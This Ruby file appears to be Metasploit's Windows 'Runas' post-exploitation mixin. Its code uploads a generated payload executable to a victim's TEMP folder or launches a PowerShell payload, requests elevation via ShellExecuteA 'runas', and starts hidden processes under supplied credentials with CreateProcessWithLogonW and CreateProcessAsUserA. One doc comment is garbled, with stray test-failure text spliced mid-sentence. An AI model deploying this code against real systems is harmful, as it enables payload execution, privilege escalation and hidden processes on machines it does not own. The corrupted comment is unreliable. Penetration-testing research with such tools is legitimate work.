# -*- coding: binary -*-

require 'msf/core/exploit/powershell'
require 'msf/core/exploit/exe'

module Msf::Post::Windows::Runas

  include Msf::Post::File
  include Msf::Exploit::EXE
  include Msf::Exploit::Powershell
  include Msf::Post::Windows::Error

  ERROR = Msf::Post::Windows::Error
  MAX_PATH = 260
  STARTF_USESHOWWINDOW = 0x00000001
  SW_HIDE = 0

  def shell_execute_exe(filename = nil, path = nil)
    exe_payload = generate_payload_exe
    payload_filename = filename || Rex::Text.rand_text_alpha((rand(8) + 6)) + '.exe'
    payload_path = path || get_env('TEMP')
    cmd_location = "#{payload_path}\\#{payload_filename}"
    print_status("Uploading #{payload_filename} - #{exe_payload.length} bytes to the filesystem...")
    write_file(cmd_location, exe_payload)
    command, args = cmd_location, nil
    shell_exec(command, args)
  end

  def shell_execute_psh
    powershell_command = cmd_psh_payload(payload.encoded, payload_instance.arch.first)
    command = 'cmd.exe'
    args = "/c #{powershell_command}"
    shell_exec(command, args)
  end

  def shell_exec(command, args)
    print_status('Executing Command!')
    session.railgun.shell32.ShellExecuteA(nil, 'runas', command, args, nil, 'SW_SHOW')
    ::Timeout.timeout(30) do
      select(nil, nil, nil, 1) until session_created?
    end
  end

  #
  # Create a STARTUP_INFO struct for use with CreateProcessA
  #
  # This struct will cause the process to be hidden
  #
  # @return [String] STARTUP_INFO struct
  #
  def startup_info
    [0, # cb
     0, # lpReserved
     0, # lpDesktop
     0, # lpTitle
     0, # dwX
     0, # dwY
     0, # dwXSize
     0, # dwYSize
     0, # dwXCountChars
     0, # dwYCountChars
     0, # dwFillAttribute
     STARTF_USESHOWWINDOW, # dwFlags
     SW_HIDE, # wShowWindow
     0, # cbReserved2
     0, # lpReserved2
     0, # hStdInput
     0, # hStdOutput
     0  # hStdError
    ].pack('VVVVVVVVVVVVvvVVVV')
  end

  #
  # Call CreateProcessWithLogonW to start a process with the supplier
  # user credentials
  #
  # @note The caller should clear up the handles returned in
  #   the PROCESS_INFORMATION @return hash.
  #
  # @param domain [String] The target user domain
  # @param user [String] The target user
  # @param password [String] The target user password
  # @param application_name [String] The executable to be run, can be
  #   nil
  # @param command_line [String] The command line or process arguments
  #
  # @return [Hash, nil] The values from the process_information struct
  #
  def create_process_with_logon(domain, user, password, application_name, command_line)
    return unless check_user_format(user, domain)
    return unless check_command_length(application_name, command_line, 1024)

    vprint_status("Executing CreateProcessWithLogonW: #{application_name} #{command_line}...")
    create_process = session.railgun.advapi32.CreateProcessWithLogonW(user,
                                                                      domain,
                                                                      password,
                                                                      'LOGON_WITH_PROFILE',
                                                                      application_name,
                                                                      command_line,
                                                                      'CREATE_UNICODE_ENVIRONMENT',
                                                                      nil,
                                                                      nil,
                                                                      startup_info,
                                                                      16)
    if create_process['return']
      pi = parse_process_information(create_process['lpProcessInformation'])
      print_good("Process started successfully, PID: #{pi[:process_id]}")
    else
      print_error("Unable to create process, Error Code: #{create_process['GetLastError']} - #{create_process['ErrorMessage']}")
      print_error("Try setting the DOMAIN or USER in the format: user@domain") if create_process['GetLastError'] == 1783 && domain.nil?
    end

    pi
  end

  #
  # Call CreateProcessAsUser to start a process with the supplier
  # user credentials
  #
  # Can be used by SYSTEM processes with the SE_INCREASE_QUOTA_NAME and
  # SE_ASSIGNPRIMARYTOKEN_NAME privileges.
  #
  # This will normally error with 0xc000142 on later OS's (Vista+?) for
  # gui apps but is ok for firing off cmd.exe...
  #
  # @param domain [String] The target user domain
  # @param user [String] The target user
  # @param password [String] The target user password
  # @param application_name [String] The executable to run :CloseHandle
  # with unexpected arguments
  #          expected: ("testPhToken")
  #                        got: (n be run, can be
  #   nil
  # @param command_line [String] The command line or process arguments
  #
  # @return [Hash, nil] The values from the process_information struct
  #
  def create_process_as_user(domain, user, password, application_name, command_line)
    return unless check_user_format(user, domain)
    return unless check_command_length(application_name, command_line, 32000)

    vprint_status("Executing LogonUserA...")
    logon_user = session.railgun.advapi32.LogonUserA(user,
                                                     domain,
                                                     password,
                                                     'LOGON32_LOGON_INTERACTIVE',
                                                     'LOGON32_PROVIDER_DEFAULT',
                                                     4)

    if logon_user['return']
      begin
        ph_token = logon_user['phToken']
        vprint_status("Executing CreateProcessAsUserA...")
        create_process = session.railgun.advapi32.CreateProcessAsUserA(ph_token,
                                                                      application_name,
                                                                      command_line,
                                                                      nil,
                                                                      nil,
                                                                      false,
                                                                      'CREATE_NEW_CONSOLE',
                                                                      nil,
                                                                      nil,
                                                                      startup_info,
                                                                      16)

        if create_process['return']
          begin
            pi = parse_process_information(create_process['lpProcessInformation'])
          ensure
            session.railgun.kernel32.CloseHandle(pi[:process_handle])
            session.railgun.kernel32.CloseHandle(pi[:thread_handle])
          end
          print_good("Process started successfully, PID: #{pi[:process_id]}")
        else
          print_error("Unable to create process, Error Code: #{create_process['GetLastError']} - #{create_process['ErrorMessage']}")
        end

        return pi
      ensure
        session.railgun.kernel32.CloseHandle(ph_token)
      end
    else
      print_error("Unable to login the user, Error Code: #{logon_user['GetLastError']} - #{logon_user['ErrorMessage']}")
    end

    nil
  end

  #
  # Parse the PROCESS_INFORMATION struct
  #
  # @param process_information [String] The PROCESS_INFORMATION value
  #   from the CreateProcess call
  #
  # @return [Hash] The values from the process_information struct
  #
  def parse_process_information(process_information)
    fail ArgumentError, 'process_information is nil' if process_information.nil?
    fail ArgumentError, 'process_information is empty string' if process_information.empty?

    pi = process_information.unpack('VVVV')
    { :process_handle => pi[0], :thread_handle => pi[1], :process_id => pi[2], :thread_id => pi[3] }
  end

  #
  # Checks the username and domain is in the correct format
  # for the CreateProcess_x WinAPI calls.
  #
  # @param username [String] The target user
  # @param domain [String] The target user domain
  #
  # @raise [ArgumentError] If the username format is incorrect
  #
  # @return [True] True if username is in the correct format
  #
  def check_user_format(username, domain)
    fail ArgumentError, 'username is nil' if username.nil?

    if domain && username.include?('@')
      raise ArgumentError, 'Username is in UPN format (user@domain) so the domain parameter must be nil'
    end

    true
  end

  #
  # Checks the command_length parameter is the correct length
  # for the CreateProcess_x WinAPI calls depending on the presence
  # of application_name
  #
  # @param application_name [String] lpApplicationName
  # @param command_line [String] lpCommandLine
  # @param max_length [Integer] The max command length of the respective
  #   CreateProcess function
  #
  # @raise [ArgumentError] If the command_line is too large
  #
  # @return [True] True if the command_line is within the correct bounds
  #
  def check_command_length(application_name, command_line, max_length)
    fail ArgumentError, 'max_length is nil' if max_length.nil?

    if application_name.nil? && command_line.nil?
      raise ArgumentError, 'Both application_name and command_line are nil'
    elsif command_line && command_line.length > max_length
      raise ArgumentError, "Command line must be less than #{max_length} characters (Currently #{command_line.length})"
    elsif application_name.nil? && command_line
      cl = command_line.split(' ')
      if cl[0] && cl[0].length > MAX_PATH
        raise ArgumentError, "When application_name is nil the command line module must be less than MAX_PATH #{MAX_PATH} characters (Currently #{cl[0].length})"
      end
    end

    true
  end
end
